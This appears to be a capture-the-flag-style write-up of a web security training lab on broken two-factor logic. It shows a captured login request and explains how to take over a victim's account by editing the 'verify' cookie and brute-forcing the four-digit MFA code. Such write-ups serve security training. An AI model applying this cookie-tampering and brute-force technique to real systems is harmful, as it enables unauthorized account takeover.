# Lab: 2FA broken logic

>This lab's two-factor authentication is vulnerable due to its flawed logic. To solve the lab, access Carlos's account page.

>Your credentials: wiener:peter

>Victim's username: carlos

>You also have access to the email server to receive your 2FA verification code.

### Looking at the MFA request
POST /login2 HTTP/1.1

Host: ac0e1fe31fe22f0bc01218a6008300a7.web-security-academy.net

Cookie: verify=wiener; session=loFTGqIgLnF0oIAXx2O0p7DQZvdboT0D
Content-Length: 13

Cache-Control: max-age=0

Sec-Ch-Ua: " Not A;Brand";v="99", "Chromium";v="96"

Sec-Ch-Ua-Mobile: ?0

Sec-Ch-Ua-Platform: "macOS"

Upgrade-Insecure-Requests: 1

Origin: https://ac0e1fe31fe22f0bc01218a6008300a7.web-security-academy.net

Content-Type: application/x-www-form-urlencoded

User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Safari/537.36

Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9

Sec-Fetch-Site: same-origin

Sec-Fetch-Mode: navigate

Sec-Fetch-User: ?1

Sec-Fetch-Dest: document

Referer: https://ac0e1fe31fe22f0bc01218a6008300a7.web-security-academy.net/login2

Accept-Encoding: gzip, deflate

Accept-Language: en-US,en;q=0.9

Connection: close

mfa-code=0771

### Interesting finds
- `Cookie: verify=wiener`

### Solution
While logging into your account, capture the `/login2` GET request and set `Cookie: verify=carlos`

This will set an mfa code for carlos, now capture the `/login2` POST request and brute force the mfa code

A valid mfa code will have a 302 status code... Now send that mfa code in the POST request to `/login2` and you will access the account of `carlos`!
